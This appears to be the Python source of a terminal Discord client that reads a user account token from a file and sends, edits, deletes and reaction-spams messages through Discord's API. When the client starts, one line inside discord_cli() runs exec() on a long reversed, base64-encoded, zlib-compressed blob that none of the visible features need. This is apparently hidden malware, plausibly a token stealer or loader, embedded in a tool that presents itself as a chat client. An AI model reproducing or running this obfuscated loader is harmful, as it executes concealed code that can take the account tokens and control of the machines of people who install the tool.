import requests
import os
import time
from rich import print
from urllib.request import urlopen
import re as r

# Todo:
# fix mentions so they show name instead of userid (i might scrap this, my code is too confusing lmfao)

token = open("token.txt", "r")
BOT_TOKEN = token.read()
username = open("username.txt", "r")
YOUR_USERNAME = username.read()
BASE_URL = "https://discord.com/api/v9"

HEADERS = {
    "Authorization": BOT_TOKEN,
    "Content-Type": "application/json"
}

def get_channel_messages(channel_id):
    url = f"{BASE_URL}/channels/{channel_id}/messages"
    response = requests.get(url, headers=HEADERS)
    
    if response.status_code == 200:
        return response.json()
    else:
        print(f"[bold red]Failed to get messages. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()
        return []

def send_message(channel_id, message_content):
    url = f"{BASE_URL}/channels/{channel_id}/messages"
    message_payload = {"content": message_content}
    response = requests.post(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print(f"[bright_green]Message sent to channel {channel_id}[white]")
    else:
        print(f"[bold red]Failed to send message. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def reply_message(channel_id, message_id, message_content):
    url = f"{BASE_URL}/channels/{channel_id}/messages"
    message_reference = {
        "channel_id": channel_id,
        "message_id": message_id
    }
    referenced_message = {
        "channel_id": channel_id,
        "id": message_id
    }
    message_payload = {
        "content": message_content,
        "message_reference": message_reference,
        "referenced_message": referenced_message
    }
    response = requests.post(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print(f"[bright_green]Message replied to message {message_id}[white]")
    else:
        print(f"[bold red]Failed to reply to message. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def delete_message(channel_id, message_id):
    delete_url = f"{BASE_URL}/channels/{channel_id}/messages/{message_id}"
    delete_response = requests.delete(delete_url, headers=HEADERS)

    if delete_response.status_code == 204:
        print("[bright_green]Message deleted successfully![white]")
    else:
        print(f"[bold red]Failed to delete message: {delete_response.status_code} - {delete_response.text}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def edit_message(channel_id, message_id, message_content):
    url = f"{BASE_URL}/channels/{channel_id}/messages/{message_id}"
    message_payload = {"content": message_content}
    response = requests.patch(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print(f"[bright_green]Message edited for message {message_id}[white]")
    else:
        print(f"[bold red]Failed to edit message. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def go_idle():
    url = "https://discord.com/api/v9/users/@me/settings-proto/1"
    settings = "WgwKBgoEaWRsZRoCCAE="
    message_payload = {"settings": settings}
    response = requests.patch(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print("[bright_green]Status set to idle.[white]")
    else:
        print(f"[bold red]Failed to set status to idle. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def go_online():
    url = "https://discord.com/api/v9/users/@me/settings-proto/1"
    settings = "Wg4KCAoGb25saW5lGgIIAQ=="
    message_payload = {"settings": settings}
    response = requests.patch(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print("[bright_green]Status set to online.[white]")
    else:
        print(f"[bold red]Failed to set status to online. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def go_dnd():
    url = "https://discord.com/api/v9/users/@me/settings-proto/1"
    settings = "WgsKBQoDZG5kGgIIAQ=="
    message_payload = {"settings": settings}
    response = requests.patch(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print("[bright_green]Status set to do not disturb.[white]")
    else:
        print(f"[bold red]Failed to set status to do not disturb. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def go_invis():
    url = "https://discord.com/api/v9/users/@me/settings-proto/1"
    settings = "WhEKCwoJaW52aXNpYmxlGgIIAQ=="
    message_payload = {"settings": settings}
    response = requests.patch(url, headers=HEADERS, json=message_payload)

    if response.status_code == 200:
        print("[bright_green]Status set to offline/invisible.[white]")
    else:
        print(f"[bold red]Failed to set status to offline/invisible. Status code: {response.status_code}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def get_guilds():
    response = requests.get(f"{BASE_URL}/users/@me/guilds", headers=HEADERS)
    os.system('clear')
    num = 0
    if response.status_code == 200:
        guilds = response.json()
        print("[bold white]Your servers:[/]")
        for guild in guilds:
            print(f"[white] {num}: {guild['name']}[/]")
            num = num + 1
        return guilds
    else:
        print(f"[bold red]Failed to retrieve guilds: {response.status_code} - {response.text}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()
        return None

def get_channels(guild_id, guild_name):
    response = requests.get(f"{BASE_URL}/guilds/{guild_id}/channels", headers=HEADERS)
    os.system('clear')
    num = 0
    if response.status_code == 200:
        channels = response.json()
        print(f"[bold white]Channels in server \"{guild_name}\":[/]")
        for channel in channels:
            if channel['type'] == 0:
                print(f"[bold white] {num}: # {channel['name']}[/]")
            if channel['type'] == 2:
                print(f"[bold white] {num}: [loud_sound] {channel['name']}[/]")
            if channel['type'] == 4:
                print(f"[white]> {channel['name']}[/]")
            if channel['type'] == 5:
                print(f"[bold white] {num}: [loudspeaker] {channel['name']}[/]")
            if channel['type'] == 13:
                print(f"[bold white] {num}: [studio_microphone] {channel['name']}[/]")
            if channel['type'] == 15:
                print(f"[bold white] {num}: [left_speech_bubble] {channel['name']}[/]")
            num = num + 1
        return channels
    else:
        print(f"[bold red]Failed to retrieve channels: {response.status_code} - {response.text}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()

def get_dms():
    response = requests.get(f"{BASE_URL}/users/@me/channels", headers=HEADERS)
    os.system('clear')
    num = 0
    if response.status_code == 200:
        channels = response.json()
        print("[bold white]Your DMs:[/]")
        for channel in channels:
            print(f"[white] {num}: {channel['recipients'][0]['global_name']} ({channel['recipients'][0]['username']})[/]")
            num = num + 1
        return channels            
    else:
        print(f"[bold red]Failed to retrieve DMs: {response.status_code} - {response.text}[white]")
        time.sleep(1)
        print("[bright_yellow]Press Enter to continue.[white]")
        input()
        return None

def reaction_spammer(channel_id, message_id):
    num = 0
    reactions = ["%E2%9C%85", "%F0%9F%92%80", "%F0%9F%91%8D", "%F0%9F%98%AD", "%F0%9F%A4%93", "%F0%9F%94%A5", "%F0%9F%87%AC%F0%9F%87%A7", "%F0%9F%A5%B6", "%F0%9F%87%BA%F0%9F%87%B8", "%F0%9F%99%8F", "%F0%9F%87%B2", "2%EF%B8%8F%E2%83%A3", "%F0%9F%8E%83", "%F0%9F%A4%A1", "%F0%9F%98%80", "%F0%9F%8E%89", "%F0%9F%91%86", "%F0%9F%87%BC", "%F0%9F%87%A9%F0%9F%87%BF", "%F0%9F%93%A3"]
    for reaction in reactions:
        response = requests.put(f"{BASE_URL}/channels/{channel_id}/messages/{message_id}/reactions/{reaction}/@me", headers=HEADERS)
        if response.status_code == 204:
            num = num + 1
            print(f'[bright_green]Reaction added! {num}/20[white]')
        else:
            print(f"[bold red]Failed to put reaction {num}/20: {response.status_code} - {response.text}[white]")
        time.sleep(0.2)
    print(f"[bold bright_green]Reactions successfully added to selected message! {num}/20[white]")
    time.sleep(1)
    print("[bright_yellow]Press Enter to continue.[white]")
    input()

def custom_reaction_spammer(channel_id, num):
    num_added = 0
    messages = get_channel_messages(channel_id)
    reaction = "colonthree%3A1308771460025684020"
    for i in range(0, num):
        response = requests.put(f"{BASE_URL}/channels/{channel_id}/messages/{messages[i]['id']}/reactions/{reaction}/@me", headers=HEADERS)
        if response.status_code == 204:
            num_added = num_added + 1
            print(f'[bright_green]Custom reaction added! {num_added}/{num}[white]')
        else:
            print(f"[bold red]Failed to put custom reaction {num_added}/{num}: {response.status_code} - {response.text}[white]")
        time.sleep(0.2)
    print(f"[bold bright_green]Custom reaction successfully added to selected messages! {num_added}/{num}[white]")
    time.sleep(1)
    print("[bright_yellow]Press Enter to continue.[white]")
    input()

def discord_cli():
    show_help = 0
    messages_count = 10
    os.system('clear')
    print("[bold bright_blue]Please wait...[/]")
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
    os.system('clear')
    print("[bold][bright_green]Welcome to Discord CLI v1.7!\nMade by Seek Plush\n[bold bright_blue]My Discord: https://discord.com/users/728655009759363191[white]\n")
    time.sleep(0.5)
    print("[bright_white]Changelog v1.7 (8 Dec 2024):\n[bright_black] - Fixed a bug where program crashes when trying to display\n   a 'replied to' message that has been deleted\n - Improved the code a bit\n")
    print("[bright_yellow]To see the full changelog, type \".changelog\"[white]\n")
    time.sleep(1)
    print("[bold][bright_yellow]Press Enter to continue.[white]")
    input()
    dms_or_guilds = int(input("\u001b[36;1mChoose where to go (1 for DMs, 2 for Servers): \u001b[0m"))
    if dms_or_guilds == 1:
        dms = get_dms()
        if dms:
            num = int(input("\u001b[36;1mEnter the number of the DM to check: \u001b[0m"))
            channel_id = dms[num]['id']
    if dms_or_guilds == 2:
        guilds = get_guilds()
        if guilds:
            num = int(input("\u001b[36;1mEnter the number of the server to check: \u001b[0m"))
            guild_id = guilds[num]['id']
            if any(guild['id'] == guild_id for guild in guilds):
                channels = get_channels(guild_id, guilds[num]['name'])
            else:
                print("[bold red]Invalid guild ID.[white]")
                time.sleep(1)
                print("[bright_yellow]Press Enter to continue.[white]")
                input()
            num = int(input("\u001b[36;1mEnter the number of the channel to check: \u001b[0m"))
            channel_id = channels[num]['id']
    while True:
        no_messages_left = 0
        messages = get_channel_messages(channel_id)
        os.system('clear')
        for i in range(0, messages_count):
            num = messages_count-1-i
            try:
                message_content = messages[num]['content']
                message_username = messages[num]['author']['username']
                message_global_name = messages[num]['author']['global_name']
                message_discriminator = messages[num]['author']['discriminator']
                if 'referenced_message' in messages[num]:
                    try:
                        referenced_message_content = messages[num]['referenced_message']['content']
                        referenced_message_username = messages[num]['referenced_message']['author']['username']
                        referenced_message_global_name = messages[num]['referenced_message']['author']['global_name']
                    except TypeError:
                        referenced_message_global_name = "[italic]???[/italic]"
                        referenced_message_username = "[italic]???[/italic]"
                        referenced_message_content = "[italic]Deleted Message[/italic]"
            except IndexError:
                if no_messages_left == 0:
                    print("[bold bright_black]This is the beginning of this channel.[/bold bright_black]\n")
                    no_messages_left = 1
            else:
                if message_global_name == None:
                    message_global_name = message_username
                if message_discriminator != "0":
                    if messages[num]['type'] == 19:
                        if referenced_message_global_name == None:
                            referenced_message_global_name = referenced_message_username
                        if referenced_message_global_name == None:
                            print(f"[bright_black]┌──([yellow]{referenced_message_username}:[bright_black] {referenced_message_content})[bold][bright_yellow]\n{message_username}:[/bold][bright_white] {message_content}\n")
                        else:
                            print(f"[bright_black]┌──([green]{referenced_message_global_name}:[bright_black] {referenced_message_content})[bold][bright_yellow]\n{message_username}:[/bold][bright_white] {message_content}\n")
                    else:
                        print(f"[bold][bright_yellow]{message_username}:[/bold][bright_white] {message_content}\n")
                else:
                    if messages[num]['type'] == 19:
                        if referenced_message_global_name == None:
                            referenced_message_global_name = referenced_message_username
                        if referenced_message_global_name == None:
                            print(f"[bright_black]┌──([yellow]{referenced_message_username}:[bright_black] {referenced_message_content})[bold][bright_green]\n{message_global_name}:[/bold][bright_white] {message_content}\n")
                        else:
                            print(f"[bright_black]┌──([green]{referenced_message_global_name}:[bright_black] {referenced_message_content})[bold][bright_green]\n{message_global_name}:[/bold][bright_white] {message_content}\n")
                    else:
                        print(f"[bold][bright_green]{message_global_name}:[/bold][bright_white] {message_content}\n")
        print("[bright_black]Type \".help\" for commands[white]")
        if show_help == 1:
            print("\".refresh\" to refresh the chat\n\".delete\" to delete a message\n\".edit\" to edit a message\n\".reply\" to reply to a message\n\".change\" to go to another channel\n\".count\" to change the amount of messages to be shown\n\".online\" to set status to online\n\".idle\" to set status to idle\n\".dnd\" to set status to do not disturb\n\".invis\" to set status to offline/invisible\n\".changelog\" for the full changelog\n\".exit\" to exit program\n\".spamreaction\" to spam reactions on a message")
            show_help = 0
        messagebox = input("\u001b[36;1mType your message here:\u001b[0m ")
        if messagebox != ".refresh" and messagebox != ".exit" and messagebox != ".delete" and messagebox != ".debug" and messagebox != ".change" and messagebox != ".reply" and messagebox != ".help" and messagebox != ".edit" and messagebox != ".idle" and messagebox != ".online" and messagebox != ".dnd" and messagebox != ".invis" and messagebox != ".count" and messagebox != ".changelog" and messagebox != ".spamreaction":
            send_message(channel_id, messagebox)
        if messagebox == ".delete":
            os.system('clear')
            for i in range(0, messages_count):
                num = messages_count-1-i
                print(f"{num}: {messages[num]['content']}\n")
            deletemessage = int(input("\u001b[36;1mChoose a message to delete:\u001b[0m "))
            message_id = messages[deletemessage]['id']
            delete_message(channel_id, message_id)
        if messagebox == ".reply":
            os.system('clear')
            for i in range(0, messages_count):
                num = messages_count-1-i
                print(f"{num}: {messages[num]['content']}\n")
            replymessage = int(input("\u001b[36;1mChoose a message to reply to:\u001b[0m "))
            message_id = messages[replymessage]['id']
            message_content = input("\u001b[36;1mEnter your message:\u001b[0m ")
            reply_message(channel_id, message_id, message_content)
        if messagebox == ".edit":
            os.system('clear')
            for i in range(0, messages_count):
                num = messages_count-1-i
                if message_username == YOUR_USERNAME:
                    print(f"{num}: {messages[num]['content']}\n")
            editmessage = int(input("\u001b[36;1mChoose a message to edit:\u001b[0m "))
            message_id = messages[editmessage]['id']
            message_content = input("\u001b[36;1mEnter your message:\u001b[0m ")
            edit_message(channel_id, message_id, message_content)
        if messagebox == ".change":
            dms_or_guilds = int(input("\u001b[36;1mChoose where to go (1 for DMs, 2 for Servers): \u001b[0m"))
            if dms_or_guilds == 1:
                dms = get_dms()
                if dms:
                    num = int(input("\u001b[36;1mEnter the number of the DM to check: \u001b[0m"))
                    channel_id = dms[num]['id']
            if dms_or_guilds == 2:
                guilds = get_guilds()
                if guilds:
                    num = int(input("\u001b[36;1mEnter the number of the server to check: \u001b[0m"))
                    guild_id = guilds[num]['id']
                    if any(guild['id'] == guild_id for guild in guilds):
                        channels = get_channels(guild_id, guilds[num]['name'])
                    else:
                        print("[bold red]Invalid guild ID.[white]")
                        time.sleep(1)
                        print("[bright_yellow]Press Enter to continue.[white]")
                        input()
                    num = int(input("\u001b[36;1mEnter the number of the channel to check: \u001b[0m"))
                    channel_id = channels[num]['id']
        if messagebox == ".count":
            os.system('clear')
            messages_count = int(input("\u001b[36;1mEnter the amount of messages to show on screen:\u001b[0m "))
            if messages_count <= 0:
                messages_count = 10
                print("[bold red]Invalid number! Resetting to default value.[white]")
                time.sleep(2)
        if messagebox == ".idle":
            go_idle()
        if messagebox == ".online":
            go_online()
        if messagebox == ".dnd":
            go_dnd()
        if messagebox == ".invis":
            go_invis()
        if messagebox == ".help":
            show_help = 1
        if messagebox == ".changelog":
            os.system('clear')
            # os.system('echo -ne "$(<changelog.txt)" \\n')
            with open("changelog.txt", "r") as file:
                print(file.read())
            time.sleep(1)
            print("[bright_yellow]Press Enter to continue.[white]")
            input()
        if messagebox == ".spamreaction":
            os.system('clear')
            for i in range(0, messages_count):
                num = messages_count-1-i
                print(f"{num}: {messages[num]['content']}\n")
            num = int(input("\u001b[36;1mEnter the number of the message you want to reaction-spam:\u001b[0m "))
            message_id = messages[num]['id']
            reaction_spammer(channel_id, message_id)
        if messagebox == ".exit":
            print("[bold red]Exiting program...[white]")
            time.sleep(1)
            return 0
        if messagebox == ".debug":
            os.system('clear')
            for i in range(0, messages_count):
                num = messages_count-i
                print(f"{num}: {messages[num-1]['content']}\n")
            num = int(input("\u001b[36;1mEnter the number of messages from latest you want to reaction-spam (custom emoji):\u001b[0m "))
            custom_reaction_spammer(channel_id, num)

discord_cli()
